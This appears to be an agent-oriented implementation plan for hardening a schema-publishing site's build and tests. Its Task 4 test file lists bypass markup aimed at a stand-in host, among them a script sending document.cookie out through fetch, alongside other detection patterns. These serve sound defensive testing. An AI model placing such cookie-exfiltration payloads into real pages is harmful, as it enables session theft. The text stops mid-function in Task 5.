# Closing the deferred findings Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Close 32 findings on a live site, replacing two guards that keep proving incomplete with checks that fail closed.

**Architecture:** Six commits, each one coherent idea with its own tests. Two of them replace a guard rather than widening it, because widening is what the last two review rounds refuted.

**Tech Stack:** Python 3.13, uv, pytest, MkDocs Material, GitHub Actions.

**Spec:** `design/2026-09-05-deferred-findings-design.md` (version 3.0)

## Global Constraints

- The published schema tree must be byte-identical before and after this work. 44 files. Verify by diff, not by count.
- No published URI changes. `$id` values are untouched by every task here.
- American English. Active voice. No em dash anywhere, in prose, comments, docstrings, or commit messages. No semicolons in prose.
- Avoid: just, very, really, actually, certainly, basically, literally, utilize, facilitate, leverage, robust, seamless, transformative, comprehensive, holistic, unlock, unleash, empower.
- Comment the why, not the what. No commented-out code. No placeholder implementations.
- Never credit an AI in a commit message, comment, or document. The git author stays the human.
- Every task ends with `uv run pytest -q` green before its commit.
- No task opens a GitHub issue, posts a comment, or takes any outward-facing action.

---

### Task 1: A schema publishes at its own location

Replaces the draft-directory name list with an identity check. This is the finding that reopened twice, and both previous fixes argued about the wrong axis.

**Files:**
- Move: `specification/ACS/acs_schema.json` to `specification/v0.1.0/acs_schema.json`
- Modify: `tools/publish_schemas.py` (docstring, `NON_NORMATIVE`, `target_for`, `publish`)
- Modify: `tools/render_landing.py:45` (the one other `target_for` caller)
- Modify: `tests/test_publish_schemas.py`
- Modify: `CONTRIBUTING.md:33`, `CLAUDE.md:75`

**Interfaces:**
- Consumes: nothing from earlier tasks.
- Produces: `target_for(doc: dict, path: Path, source: Path) -> str`. The third parameter is new. Every caller must pass the schema source root.

- [ ] **Step 1: Write the failing tests**

Replace the existing non-normative test in `tests/test_publish_schemas.py` with these three. Keep every other test in the file.

```python
DRAFT_DIRS = [
    "proposals", "Proposals", "PROPOSALS", "proposal", "drafts", "draft",
    "_drafts", "draft-v2", "drafty", "wip", "experimental", "sandbox",
    "staging", "rc", "preview", "candidate", "unreleased", "incubator",
    "beta", "pending", "scratch", "playground", "prototype",
    "ｐｒｏｐｏｓａｌｓ",   # fullwidth
    "dra‍ft",                                               # zero-width joiner
    "prоposаls",                                       # Cyrillic homoglyphs
]


@pytest.mark.parametrize("directory", DRAFT_DIRS)
def test_no_directory_name_can_claim_the_normative_namespace(tmp_path, directory):
    """The old check was a name list, so it only ever refused names already on it.

    These are the complement the list could not cover, including three that render
    identically to a blocked word in a diff.
    """
    src = tmp_path / "spec"
    write_schema(src, f"{directory}/nested/sneak.json", BASE + "v0.1.0/sneak.json")
    with pytest.raises(SchemaError, match="but the file sits at"):
        publish(src, tmp_path / "out")


def test_a_draft_declaring_its_own_location_is_refused_by_the_tail_pattern(tmp_path):
    """The honest form fails too, so a draft has no way through at all."""
    src = tmp_path / "spec"
    write_schema(src, "proposals/honest.json", BASE + "proposals/honest.json")
    with pytest.raises(SchemaError, match="not a safe publish path"):
        publish(src, tmp_path / "out")


def test_a_schema_publishes_at_the_path_its_id_names(tmp_path):
    src = tmp_path / "spec"
    write_schema(src, "v0.1.0/hooks/a.json", BASE + "v0.1.0/hooks/a.json")
    assert publish(src, tmp_path / "out") == ["v0.1.0/hooks/a.json"]
```

- [ ] **Step 2: Run them to verify they fail**

Run: `uv run pytest tests/test_publish_schemas.py -q`
Expected: the parametrized cases fail because those directory names publish today. `test_a_draft_declaring_its_own_location` fails because the old code has no such refusal.

- [ ] **Step 3: Move the one file that breaks the identity**

```bash
git mv specification/ACS/acs_schema.json specification/v0.1.0/acs_schema.json
rmdir specification/ACS
```

Verify the identity now holds for all 44:

```bash
uv run python - <<'PY'
import json, pathlib
BASE = "https://genai-security-project.github.io/agent-control-standard/schema/"
src = pathlib.Path("specification")
bad = [p for p in src.rglob("*.json")
       if json.loads(p.read_text()).get("$id", "")[len(BASE):] != p.relative_to(src).as_posix()]
print(f"schemas={len(list(src.rglob('*.json')))} mismatched={len(bad)}")
PY
```

Expected: `schemas=44 mismatched=0`

- [ ] **Step 4: Replace the name list with the identity check**

In `tools/publish_schemas.py`, delete these two lines:

```python
# Draft schemas live here. They must never publish to a normative URI.
NON_NORMATIVE = ("proposals",)
```

Replace `target_for` entirely:

```python
def target_for(doc: dict, path: Path, source: Path) -> str:
    """Return the validated publish path a document's $id declares.

    The $id must name the file's own location under source. That identity is what
    keeps a draft out of the normative namespace. Claiming it would mean declaring
    an $id that names the draft directory, and SAFE_TAIL refuses that for want of a
    version segment. No directory name is involved, so nothing needs extending when
    someone invents a new word for "not ready yet".
    """
    sid = doc.get("$id")
    if not sid:
        raise SchemaError(f"{path}: no $id")
    if not sid.startswith(BASE):
        raise SchemaError(f"{path}: $id outside namespace: {sid}")

    tail = sid[len(BASE) :]
    if unquote(tail) != tail:
        raise SchemaError(f"{path}: $id must not be percent-encoded: {sid}")
    if not SAFE_TAIL.match(tail):
        raise SchemaError(
            f"{path}: $id tail {tail!r} is not a safe publish path. "
            "Expected v<version>/<name>.json with no traversal and no absolute prefix."
        )
    on_disk = path.relative_to(source).as_posix()
    if tail != on_disk:
        raise SchemaError(
            f"{path}: $id declares {tail!r} but the file sits at {on_disk!r}. "
            "A schema publishes at its own location, so the two must match."
        )
    return tail
```

Replace the module docstring's first paragraph, which describes a layout that no longer exists:

```python
"""Publish JSON schemas to the paths their own $id values declare.

Every schema sits at the path its $id names, so publishing is a copy and the check
that a draft is not claiming a normative URI is an identity test rather than a list
of directory names to keep extending.

$id is attacker-influenced input, not trusted identity. Anyone who can land a file under
specification/ controls the string, and a fork pull request reaches this code on the
runner before review. Every path derived from it is validated and contained.
"""
```

- [ ] **Step 5: Update the two callers**

In `tools/publish_schemas.py`, inside `publish()`: `rel = target_for(doc, path)` becomes `rel = target_for(doc, path, source)`.

In `tools/render_landing.py:45`: `target_for(doc, path)` becomes `target_for(doc, path, source)`.

- [ ] **Step 6: Run the tests and check the real tree**

Run: `uv run pytest -q`
Expected: PASS.

```bash
uv run python tools/publish_schemas.py specification /tmp/t1 && find /tmp/t1 -type f | wc -l
```

Expected: `published 44 schemas` and `44`. Count files, not directory entries. `ls /tmp/t1/v0.1.0 | wc -l` reports 14, because it counts each subdirectory as one entry, and would hide 27 dropped files under `hooks/`.

- [ ] **Step 7: Update the two documents naming the old path**

`CONTRIBUTING.md:33` and `CLAUDE.md:75`: `specification/ACS/acs_schema.json` becomes `specification/v0.1.0/acs_schema.json`.

Then add to the Schema namespace section of `CLAUDE.md`, after the paragraph beginning "`$id` is identity, not a fetch target.":

```markdown
Every schema sits at the path its `$id` names, relative to `specification/`. That identity
is the check that keeps a draft out of the normative namespace, so a new schema goes at the
path its `$id` declares and nowhere else.
```

- [ ] **Step 8: Commit**

```bash
git add specification tools/publish_schemas.py tools/render_landing.py \
        tests/test_publish_schemas.py CONTRIBUTING.md CLAUDE.md
git commit -F - <<'MSG'
Require a schema's $id to match its location

The draft-directory check was a name list. Two rounds of review argued about
what belonged on the list and how deep to match, and both were the wrong axis:
a list cannot enumerate its complement. Measured against the six-name version,
26 directory names still published a draft to the normative namespace, three of
them Unicode variants that render as the blocked word in a diff.

One schema had an $id tail that differed from its path. Moving it makes the two
identical for all 44, which turns the check into an identity test. A draft
claiming the normative namespace now has to declare an $id naming its own draft
directory, and SAFE_TAIL refuses that for want of a version segment. A draft
declaring its honest location is refused the same way.

No published URI changes. The publish output is byte-identical.
MSG
```

---

### Task 2: Write only what validation read

**Files:**
- Modify: `tools/publish_schemas.py` (`load_schemas`, new `_read`, `publish`)
- Modify: `tests/test_publish_schemas.py`

**Interfaces:**
- Consumes: `target_for(doc, path, source)` from Task 1.
- Produces: `_read(source: Path) -> dict[Path, tuple[dict, bytes]]`. `load_schemas(source) -> dict[Path, dict]` keeps its signature, so `render_landing.py` needs no change for this task.

- [ ] **Step 1: Write the failing tests**

Add to `tests/test_publish_schemas.py`:

```python
def test_a_dangling_ref_leaves_no_output_directory(tmp_path):
    """Absence, not emptiness. An implementation that mkdirs first satisfies 'empty'."""
    src = tmp_path / "spec"
    out = tmp_path / "out"
    write_schema(src, "v0.1.0/a.json", BASE + "v0.1.0/a.json",
                 extra={"properties": {"x": {"$ref": BASE + "v0.1.0/gone.json"}}})
    with pytest.raises(SchemaError, match="which no \\$id publishes"):
        publish(src, out)
    assert not out.exists()


def test_the_written_bytes_are_the_bytes_that_were_parsed(tmp_path, monkeypatch):
    """A second read at write time could substitute content nothing validated.

    Mutating the file the instant parsing finishes proves which read feeds the write.
    """
    import tools.publish_schemas as ps

    src = tmp_path / "spec"
    out = tmp_path / "out"
    target = write_schema(src, "v0.1.0/a.json", BASE + "v0.1.0/a.json")
    real_read = ps._read

    def read_then_tamper(source):
        parsed = real_read(source)
        target.write_bytes(b'{"$id": "tampered, never validated"}')
        return parsed

    monkeypatch.setattr(ps, "_read", read_then_tamper)
    ps.publish(src, out)
    written = json.loads((out / "v0.1.0/a.json").read_text())
    assert written["$id"] == BASE + "v0.1.0/a.json"
```

If `write_schema` does not already return the path it wrote, add `return path` to it.

- [ ] **Step 2: Run them to verify they fail**

Run: `uv run pytest tests/test_publish_schemas.py -k "dangling or written_bytes" -q`
Expected: the first fails on `assert not out.exists()`, the second on `AttributeError: module 'tools.publish_schemas' has no attribute '_read'`.

- [ ] **Step 3: Keep the bytes with the parsed document**

Replace `load_schemas` in `tools/publish_schemas.py`:

```python
def _read(source: Path) -> dict[Path, tuple[dict, bytes]]:
    """Parse every JSON file under source that declares an $id, keeping its raw bytes.

    The bytes travel with the parsed document so the publish step writes what it
    validated. Re-reading at write time would leave a window that widens with every
    file, because the whole package is validated in between.

    Files without an $id are skipped rather than fatal. Example payloads and fixtures
    live under specification/ too, and a contributor adding one must not stop the deploy.
    """
    schemas: dict[Path, tuple[dict, bytes]] = {}
    for path in sorted(source.rglob("*.json")):
        raw = path.read_bytes()
        try:
            doc = json.loads(raw.decode("utf-8"))
        except UnicodeDecodeError as error:
            raise SchemaError(f"{path}: not valid UTF-8: {error}") from error
        except json.JSONDecodeError as error:
            raise SchemaError(f"{path}: invalid JSON: {error}") from error
        if not isinstance(doc, dict) or "$id" not in doc:
            continue
        schemas[path] = (doc, raw)
    return schemas


def load_schemas(source: Path) -> dict[Path, dict]:
    """Parse every JSON file under source that declares an $id."""
    return {path: doc for path, (doc, _raw) in _read(source).items()}
```

- [ ] **Step 4: Validate everything before writing anything**

Replace the body of `publish()`:

```python
def publish(source: Path, out: Path) -> list[str]:
    """Write every schema to its $id-declared path. Return sorted relative paths.

    Nothing is written until every schema validates and every $ref resolves, so a
    failed build leaves no output directory rather than a partial one. The bytes
    written are the bytes parsed, so no second read can substitute content that
    nothing checked.
    """
    parsed = _read(source)
    if not parsed:
        raise SchemaError(f"no schemas found under {source}")

    out_root = out.resolve()
    by_id: dict[str, dict] = {}
    seen: dict[str, Path] = {}
    planned: list[tuple[Path, str, bytes]] = []

    for path, (doc, raw) in parsed.items():
        rel = target_for(doc, path, source)
        sid = doc["$id"]
        if sid in seen:
            raise SchemaError(f"{path}: duplicate $id {sid}, already declared by {seen[sid]}")
        seen[sid] = path

        destination = (out / rel).resolve()
        # Belt and braces. SAFE_TAIL should make this unreachable. If it ever is
        # reachable, the build stops rather than writing outside the artifact.
        if not destination.is_relative_to(out_root):
            raise SchemaError(f"{path}: $id escapes the output root: {sid}")

        planned.append((destination, rel, raw))
        by_id[sid] = doc

    verify_refs({path: doc for path, (doc, _raw) in parsed.items()}, by_id)

    for destination, _rel, payload in planned:
        destination.parent.mkdir(parents=True, exist_ok=True)
        destination.write_bytes(payload)
    return sorted(rel for _destination, rel, _payload in planned)
```

`shutil` is now unused in this module. Remove the import.

- [ ] **Step 5: Run the tests, then diff the published tree**

Run: `uv run pytest -q`
Expected: PASS.

The output must match what the site serves today. Compare against the tree Task 1 Step 6 wrote, which is the same 44 files at the same paths:

```bash
uv run python tools/publish_schemas.py specification /tmp/t2 >/dev/null
diff -r /tmp/t1 /tmp/t2 && echo IDENTICAL
```

Expected: `IDENTICAL`.

- [ ] **Step 6: Commit**

```bash
git add tools/publish_schemas.py tests/test_publish_schemas.py
git commit -F - <<'MSG'
Validate every schema before writing any of them

publish() wrote each file as it validated it, so a failure partway through left
a directory holding part of the package. The output is a published namespace,
and a half-written one is worse than none.

The bytes now travel with the parsed document. The previous attempt at this
claimed to write the bytes validation read and did not: load_schemas called
read_text to parse and discarded it, then the publish loop called read_bytes
again. Two reads, with the whole package validated in between. One read serves
both now, and a test tampers with the file after parsing to prove which read
feeds the write.
MSG
```

---

### Task 3: One load, one version key, two honest tests

**Files:**
- Modify: `tools/render_landing.py`
- Modify: `tests/test_render_landing.py`

**Interfaces:**
- Consumes: `target_for(doc, path, source)` from Task 1.
- Produces: `_version_key(version: str) -> tuple[int, ...]`, `_versions(source: Path) -> dict[str, int]`, `_schema_facts(source: Path) -> tuple[str, int]`.

- [ ] **Step 1: Write the failing tests**

Add to `tests/test_render_landing.py`, and replace the existing copy-failure test with the version below:

```python
@pytest.fixture
def multi_version_tree(tmp_path):
    """Two versions, with the newer holding fewer schemas.

    Both numbers differ from the total, or an assertion cannot tell "count within
    the reported version" from "count everything".
    """
    src = tmp_path / "spec"
    for name in ("a", "b", "c"):
        write_schema(src, f"v0.2.0/{name}.json", BASE + f"v0.2.0/{name}.json")
    for name in ("d", "e"):
        write_schema(src, f"v0.10.0/{name}.json", BASE + f"v0.10.0/{name}.json")
    return src


def test_the_count_belongs_to_the_version_it_is_printed_beside(multi_version_tree):
    version, count = render_landing._schema_facts(multi_version_tree)
    assert version == "v0.10.0"
    assert count == 2, "counting all five states a number about the wrong version"


def test_version_order_is_numeric_not_lexicographic(multi_version_tree):
    """v0.10.0 sorts above v0.2.0 only under a numeric key.

    The single-version fixture this replaced could not tell the two apart, so a
    deliberately broken comparison still passed.
    """
    assert render_landing._schema_facts(multi_version_tree)[0] == "v0.10.0"
    assert render_landing.spec_version(multi_version_tree) == "v0.10.0"


def test_main_reports_a_copy_failure_without_a_traceback(tmp_path, monkeypatch, capsys):
    """The fixture carries every placeholder, or render raises before the copy.

    The version this replaced omitted four of the five, so it passed identically
    against the code that had copytree outside the error boundary.
    """
    landing = tmp_path / "landing"
    (landing / "assets").mkdir(parents=True)
    (landing / "index.html").write_text("".join(render_landing.REQUIRED_PLACEHOLDERS))
    (landing / "assets" / "starburst.svg").write_text("<svg></svg>")

    def boom(*args, **kwargs):
        raise OSError("assets unreadable")

    monkeypatch.setattr(render_landing.shutil, "copytree", boom)
    monkeypatch.chdir(tmp_path)
    assert render_landing.main(["render_landing.py", str(landing), str(tmp_path / "out")]) == 1
    assert "assets unreadable" in capsys.readouterr().err
```

The copy test needs a template that survives placeholder validation and a schema source that resolves. If `main` reads `specification/` relative to the repository root rather than the chdir target, drop the `monkeypatch.chdir` line and let it read the real tree.

- [ ] **Step 2: Run them to verify they fail**

Run: `uv run pytest tests/test_render_landing.py -q`
Expected: the first two fail with `AttributeError: module has no attribute '_schema_facts'`. The copy test fails with an `OSError` traceback rather than a return code of 1.

- [ ] **Step 3: Share the version logic**

Replace `_versions`, `spec_version`, and `schema_count` in `tools/render_landing.py`:

```python
def _version_key(version: str) -> tuple[int, ...]:
    """Order versions numerically, so v0.10.0 sorts above v0.2.0 rather than below it."""
    return tuple(int(part) for part in version.lstrip("v").split("."))


def _versions(source: Path) -> dict[str, int]:
    """Map each spec version present to the number of schemas it publishes."""
    try:
        docs = load_schemas(source)
        counts: dict[str, int] = {}
        for path, doc in docs.items():
            version = target_for(doc, path, source).split("/")[0]
            counts[version] = counts.get(version, 0) + 1
        return counts
    except SchemaError as error:
        raise RenderError(str(error)) from error


def _schema_facts(source: Path) -> tuple[str, int]:
    """Return the newest spec version and how many schemas that version publishes.

    Old versions stay published so their $id URIs keep resolving, so more than one
    version is the expected steady state. Counting across all of them would print a
    total beside a single version name and say something false about that version.
    """
    counts = _versions(source)
    if not counts:
        raise RenderError(f"no schemas found under {source}")
    version = max(counts, key=_version_key)
    return version, counts[version]


def spec_version(source: Path) -> str:
    return _schema_facts(source)[0]


def schema_count(source: Path) -> int:
    return _schema_facts(source)[1]
```

- [ ] **Step 4: Load once in render**

In `render()`, replace the separate `spec_version` and `schema_count` calls:

```python
    version, count = _schema_facts(source)
    out = template.replace("<!--ACS:SPEC_VERSION-->", html.escape(version))
    out = out.replace("<!--ACS:SCHEMA_COUNT-->", str(count))
```

The `SCHEMA_HREF` line already uses `version` and needs no change.

- [ ] **Step 5: Widen the error boundary in main**

Move `out.mkdir`, the `index.html` write, and `shutil.copytree` inside the existing `try`. Give the output phase its own clause, keeping the existing one for reading the landing sources so a reader can tell which half failed. `shutil.Error` subclasses `OSError`, so one clause covers both:

```python
    except OSError as error:
        print(f"error: cannot write the rendered site: {error}", file=sys.stderr)
        return 1
```

- [ ] **Step 6: Run the tests and check the rendered page**

Run: `uv run pytest -q`
Expected: PASS.

```bash
uv run python tools/render_landing.py landing /tmp/r1 && \
  grep -o 'v0\.1\.0' /tmp/r1/index.html | head -1 && \
  grep -oE '\b44\b' /tmp/r1/index.html | head -1
```

Expected: `v0.1.0` and `44`. The live page must not change.

- [ ] **Step 7: Commit**

```bash
git add tools/render_landing.py tests/test_render_landing.py
git commit -F - <<'MSG'
Share the version logic and count within the version reported

render() loaded and parsed the schema tree twice, once for the version and once
for the count, and the numeric version comparison existed in one of the two
paths while the other used a plain max. A divergence ships a wrong version to
the live page.

The count now belongs to the version printed beside it. Counting every schema in
the repository while naming one version says something false about that version,
and it goes live the day a second version ships.

Two tests are rewritten because they passed for the wrong reason. The copy
failure test used a fixture missing four required placeholders, so render raised
before reaching the copy and the test passed against the unfixed code. The
version test used a single-version fixture, which cannot tell a numeric
comparison from a lexicographic one.
MSG
```

---

### Task 4: Invert the third-party guard

**Files:**
- Modify: `tests/conftest.py`
- Create: `tests/test_third_party_guard.py`
- Modify: every consumer. Find them with `grep -rln "third_party_hosts\|RESOURCE_TAG\|IMPORT_RULE\|URL_FUNC" tests/`

**Interfaces:**
- Consumes: nothing from earlier tasks.
- Produces: `third_party_hosts(markup: str, self_hosts: set[str]) -> set[str]` with an unchanged signature, plus `external_bases(markup: str) -> list[str]`, `stylesheet_hosts(css: str, self_hosts: set[str]) -> set[str]`, and `VENDORED_PREFIXES: tuple[str, ...]`. The names `RESOURCE_TAG`, `IMPORT_RULE`, and `URL_FUNC` are removed.

- [ ] **Step 1: Write the failing tests**

Create `tests/test_third_party_guard.py`:

```python
"""The guard has been found incomplete five times. It is tested by its bypasses."""
import pytest

from conftest import external_bases, third_party_hosts

SELF = {"genai-security-project.github.io"}

MUST_CATCH = {
    "inline script body": '<script>fetch("https://evil.tld/b?"+document.cookie)</script>',
    "svg use href": '<svg><use href="https://evil.tld/s.svg#x"></use></svg>',
    "svg image href": '<svg><image href="https://evil.tld/i.png"/></svg>',
    "meta refresh": '<meta http-equiv="refresh" content="0;url=https://evil.tld/">',
    "css image-set": '<style>b{background:image-set("https://evil.tld/a.png" 1x)}</style>',
    "tab inside the scheme": '<img src="ht\tps://evil.tld/x.png">',
    "second attribute on one tag":
        '<video src="//genai-security-project.github.io/a.mp4" poster="//evil.tld/b.jpg">',
    "anchor ping": '<a href="/local" ping="https://evil.tld/beacon">x</a>',
    "unquoted src": "<img src=//evil.tld/x.png>",
    "srcset second url": '<img srcset="/a.png 1x, //evil.tld/b.png 2x">',
    "link stylesheet": '<link rel="stylesheet" href="https://evil.tld/s.css">',
    "iframe": '<iframe src="https://evil.tld/f"></iframe>',
    "object data": '<object data="https://evil.tld/o"></object>',
}

MUST_IGNORE = {
    "prose anchor": '<p>See <a href="https://github.com/owasp/x">the repo</a>.</p>',
    "blockquote cite": '<blockquote cite="https://example.org/z">q</blockquote>',
    "self-hosted asset": '<img src="https://genai-security-project.github.io/a.png">',
    "relative asset": '<img src="assets/a.png"><link rel="stylesheet" href="s.css">',
    "javascript line comment": "<script>\n// see https not a url\nvar x=1;\n</script>",
    "svg namespace": '<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>',
}


@pytest.mark.parametrize("markup", MUST_CATCH.values(), ids=list(MUST_CATCH))
def test_every_known_bypass_is_caught(markup):
    assert "evil.tld" in third_party_hosts(markup, SELF)


@pytest.mark.parametrize("markup", MUST_IGNORE.values(), ids=list(MUST_IGNORE))
def test_prose_and_self_hosted_references_are_not_fetches(markup):
    assert third_party_hosts(markup, SELF) == set()


def test_a_base_element_is_refused_outright():
    """base rewrites resolution for the whole page, so every relative URL leaves the site.

    No host appears in any other attribute afterwards, which is why a host-matching
    guard can never see it.
    """
    assert external_bases('<base href="https://evil.tld/"><img src="logo.png">')


def test_a_namespace_declaration_cannot_smuggle_a_fetch():
    markup = '<svg xmlns="http://www.w3.org/2000/svg"><use href="https://evil.tld/s#x"/></svg>'
    assert "evil.tld" in third_party_hosts(markup, SELF)
```

- [ ] **Step 2: Run it to verify it fails**

Run: `uv run pytest tests/test_third_party_guard.py -q`
Expected: `ImportError: cannot import name 'external_bases' from 'conftest'`.

- [ ] **Step 3: Replace the guard**

Replace the whole of `tests/conftest.py`:

```python
"""Shared guards that keep the published site from contacting a third party.

The guard has been found incomplete five times. Every earlier version enumerated the
attributes that fetch, and each new construct was a fresh gap: a poster attribute, an
unquoted value, a stylesheet, a base element, an inline script body. So this one
enumerates the positions that do not fetch instead. Anything else carrying an absolute
URL counts as a fetch, which makes an unanticipated construct a failure rather than a
silent pass.
"""
import html.parser
import re

# Positions a browser resolves but never fetches from. Everything else is a fetch.
NON_FETCHING = frozenset({
    ("a", "href"), ("area", "href"),
    ("blockquote", "cite"), ("q", "cite"), ("ins", "cite"), ("del", "cite"),
    ("form", "action"), ("button", "formaction"), ("input", "formaction"),
})
# A namespace URI names a vocabulary. No browser resolves it, and the built site
# carries several hundred of them on inline SVG.
NON_FETCHING_ATTRS = frozenset({"xmlns"})

# The URL parser strips ASCII tab and newline before resolving, so a scheme broken
# across one still fetches. Strip them before matching rather than after.
_NOISE = re.compile(r"[\t\r\n]")
# In an attribute, a protocol-relative value is a fetch.
_IN_ATTR = re.compile(r"""(?:[a-z][a-z0-9+.-]*:)?//([^\s/?#'\"),]+)""", re.I)
# In script or style text, require a scheme. A bare // opens a JavaScript comment far
# more often than a protocol-relative URL, and a false positive here is the kind of
# noise that gets a guard switched off.
_IN_TEXT = re.compile(r"""\bhttps?://([^\s/?#'\"),]+)""", re.I)

# Scripts under these paths come from the installed theme and are pinned by uv.lock.
# A prefix, not a substring: docs/assets/javascripts/tracker.js contains the segment
# while being first-party code that belongs in front of a human.
VENDORED_PREFIXES = ("docs/assets/javascripts/",)


class _Scanner(html.parser.HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.attr_values: list[str] = []
        self.text_values: list[str] = []
        self.bases: list[str] = []
        self._capturing: str | None = None

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        if tag == "base":
            self.bases.append(dict(attrs).get("href") or "")
        for name, value in attrs:
            if not value or (tag, name) in NON_FETCHING:
                continue
            if name.split(":")[0] in NON_FETCHING_ATTRS:
                continue
            self.attr_values.append(value)
        if tag in ("script", "style"):
            self._capturing = tag

    handle_startendtag = handle_starttag

    def handle_endtag(self, tag: str) -> None:
        if tag == self._capturing:
            self._capturing = None

    def handle_data(self, data: str) -> None:
        if self._capturing:
            self.text_values.append(data)


def _scan(markup: str) -> _Scanner:
    scanner = _Scanner()
    scanner.feed(markup)
    return scanner


def third_party_hosts(markup: str, self_hosts: set[str]) -> set[str]:
    """Return every third-party host the markup would fetch from."""
    scanner = _scan(markup)
    hosts: set[str] = set()
    for value in scanner.attr_values:
        hosts |= {m.group(1).lower() for m in _IN_ATTR.finditer(_NOISE.sub("", value))}
    for value in scanner.text_values:
        hosts |= {m.group(1).lower() for m in _IN_TEXT.finditer(_NOISE.sub("", value))}
    return hosts - {host.lower() for host in self_hosts}


def external_bases(markup: str) -> list[str]:
    """Return every base element href. Any one of them redirects the whole page."""
    return [href for href in _scan(markup).bases if href]


def stylesheet_hosts(css: str, self_hosts: set[str]) -> set[str]:
    """Return every third-party host a stylesheet would fetch from.

    Covers url(), @import, and image-set(), which takes a bare quoted string rather
    than a url() wrapper and so escaped the previous pattern.
    """
    hosts = {m.group(1).lower() for m in _IN_ATTR.finditer(_NOISE.sub("", css))}
    return hosts - {host.lower() for host in self_hosts}
```

- [ ] **Step 4: Update the consumers**

Run the grep from the Files section and update every file it names. Rules:

- A consumer scanning built HTML also asserts `external_bases(markup) == []`.
- A consumer scanning a stylesheet calls `stylesheet_hosts` rather than `third_party_hosts`.
- Any import of `RESOURCE_TAG`, `IMPORT_RULE`, or `URL_FUNC` switches to the functions, because those names are gone.

Add to whichever test walks the built site:

```python
def test_no_first_party_javascript_ships(built_site):
    """Every script comes from the pinned theme.

    A prefix, not a substring. A path merely containing assets/javascripts/ can be
    our own code sitting in the docs tree.
    """
    stray = [
        p.relative_to(built_site).as_posix()
        for p in built_site.rglob("*.js")
        if not p.relative_to(built_site).as_posix().startswith(VENDORED_PREFIXES)
    ]
    assert stray == [], f"first-party JavaScript needs a human decision: {stray}"
```

If the built-site fixture puts the docs under a different prefix than `docs/`, correct `VENDORED_PREFIXES` to match the real built path rather than adjusting the test.

- [ ] **Step 5: Run the tests**

Run: `uv run pytest -q`
Expected: PASS.

- [ ] **Step 6: Watch the guard bite, then revert**

A guard found incomplete five times is verified by watching it fail, not by reading it.

```bash
printf '\n<img src="https://cdn.evil.tld/p.png">\n' >> docs/index.md
uv run pytest -q ; echo "^ must FAIL"
git checkout docs/index.md
printf '\nbody{background-image:image-set("https://evil.tld/x.png" 1x)}\n' >> docs/stylesheets/extra.css
uv run pytest -q ; echo "^ must FAIL"
git checkout docs/stylesheets/extra.css
uv run pytest -q ; echo "^ must PASS"
git diff --quiet && echo "tree clean"
```

Expected: FAIL, FAIL, PASS, `tree clean`.

- [ ] **Step 7: Commit**

```bash
git add tests/
git commit -F - <<'MSG'
Treat every attribute as a fetch unless it is on the exempt list

The guard has been found incomplete five times. Each earlier fix named the
attribute that had just been missed, which left the next one open. Nine
constructs defeated the last version: a base element, an inline script body,
SVG use and image, a meta refresh, image-set in CSS, a tab inside the scheme,
a second fetch attribute on the same tag, and anchor ping.

It now parses the markup and walks every attribute on every element, treating
each as a fetch unless the pair sits on a short exempt list. Script and style
bodies are scanned. Tab and newline are stripped before matching, because the
URL parser strips them before resolving. A base element is refused outright,
since it rewrites resolution for the whole page and leaves no host anywhere for
a host-matching guard to find.

The vendored-script check becomes a prefix test. As a substring it accepted
docs/assets/javascripts/tracker.js as pinned theme code.

Measured against the built site: 38 pages, no third-party host, no base element.
MSG
```

---

### Task 5: Verify every published URI

**Files:**
- Modify: `tools/verify_published.py`
- Create: `tests/test_verify_published.py`
- Modify: `.github/workflows/deploy-pages.yml`, `.github/workflows/monitor-pages.yml`

**Interfaces:**
- Consumes: `target_for(doc, path, source)` from Task 1 and `load_schemas` from Task 2.
- Produces: `paths_from(source: Path) -> list[str]`.

- [ ] **Step 1: Write the failing tests**

Create `tests/test_verify_published.py`:

```python
"""The module had no test file, so three of its defects shipped unnoticed."""
import json

import pytest

import tools.verify_published as vp


@pytest.fixture(autouse=True)
def no_sleeping(monkeypatch):
    """Six attempts at ten seconds each would make this suite a minute slower."""
    calls = []
    monkeypatch.setattr(vp.time, "sleep", lambda seconds: calls.append(seconds))
    return calls


def test_a_non_object_body_is_not_retried(monkeypatch, no_sleeping):
    """It parsed and it is wrong. Waiting cannot change that, and .get would raise."""
    monkeypatch.setattr(vp, "fetch", lambda url: ["not", "an", "object"])
    with pytest.raises(SystemExit, match="not a JSON object"):
        vp.check("https://example.com", "v0.1.0/a.json")
    assert no_sleeping == []


def test_a_decoding_failure_is_retried(monkeypatch, no_sleeping):
    def boom(url):
        raise UnicodeDecodeError("utf-8", b"\xff", 0, 1, "invalid start byte")

    monkeypatch.setattr(vp, "fetch", boom)
    with pytest.raises(SystemExit, match="never became available"):
        vp.check("https://example.com", "v0.1.0/a.json")
    assert len(no_sleeping) == vp.ATTEMPTS - 1, "no sleep after the final attempt"


def test_a_wrong_id_reports_what_was_served(monkeypatch, no_sleeping):
    monkeypatch.setattr(vp, "fetch", lambda url: {"$id": "https://elsewhere/x.json"})
    with pytest.raises(SystemExit, match="serves \\$id"):
        vp.check("https://example.com", "v0.1.0/a.json")


def test_paths_come_from_the_schema_tree(tmp_path):
    """Two hardcoded paths in two workflows left 42 of 44 URIs unchecked."""
    base = "https://genai-security-project.github.io/agent-control-standard/schema/"
    src = tmp_path / "spec"
    (src / "v0.1.0" / "hooks").mkdir(parents=True)
    for rel in ("v0.1.0/a.json", "v0.1.0/hooks/b.json"):
        (src / rel).write_text(json.dumps({"$id": base + rel}))
    assert vp.paths_from(src) == ["v0.1.0/a.json", "v0.1.0/hooks/b.json"]
```

- [ ] **Step 2: Run it to verify it fails**

Run: `uv run pytest tests/test_verify_published.py -q`
Expected: four failures. The non-object case raises `AttributeError` on `.get`, the decode case is not caught by the retry clause, and `paths_from` does not exist.

- [ ] **Step 3: Fix the checker and derive the path list**

In `tools/verify_published.py`, add `from pathlib import Path` to the imports, then add `paths_from` and replace `check`:

```python
def paths_from(source: Path) -> list[str]:
    """Derive every publishable path from the schema tree.

    Two hardcoded paths duplicated across two workflows left 42 of the 44 published
    URIs with no post-deploy check and nothing keeping the two copies in step.
    """
    from publish_schemas import load_schemas, target_for

    return sorted(target_for(doc, path, source) for path, doc in load_schemas(source).items())


def check(base: str, path: str) -> None:
    url = f"{base.rstrip('/')}/{path}"
